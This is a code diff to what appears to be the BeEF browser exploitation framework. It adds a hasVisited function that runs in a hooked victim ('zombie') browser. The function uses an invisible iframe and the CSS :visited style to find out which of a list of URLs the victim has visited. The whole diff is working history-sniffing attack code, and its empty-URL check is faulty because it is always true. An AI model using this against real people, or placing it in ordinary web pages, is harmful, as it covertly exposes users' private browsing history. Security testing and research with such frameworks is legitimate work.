@@ -329,6 +329,46 @@ beef.browser = {
 		details["HostName"] = 	 		 document.location.hostname;
 		
 		return details;
+	},
+	
+	/**
+	 * Returns boolean (or array of results), whether or not the target zombie has visited the specified URL
+	 */
+	hasVisited: function(urls) {
+		var results = new Array();
+		var iframe = beef.dom.createInvisibleIframe();
+		var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
+		ifdoc.open();
+		ifdoc.write('<style>a:visited{width:0px !important;}</style>');
+		ifdoc.close();
+		urls = urls.split("\n");
+		var count = 0;
+		for (var i in urls)
+		{
+			var u = urls[i];
+			if (u != "" || u != null)
+			{
+				var success = false;
+				var a = ifdoc.createElement('a');
+				a.href = u;
+				ifdoc.body.appendChild(a);
+				var width = null;
+				(a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width"); 
+				if (width == '0px') {
+					success = true;
+				}
+				results.push({'url':u, 'visited':success});
+				count++;
+			}
+		}
+		beef.dom.removeElement(iframe);
+		if (results.length == 0) 
+		{
+			return false;
+		} else if (results.length == 1) {
+			return results[0].visited;
+		}
+		return results;
 	}
 	
 };
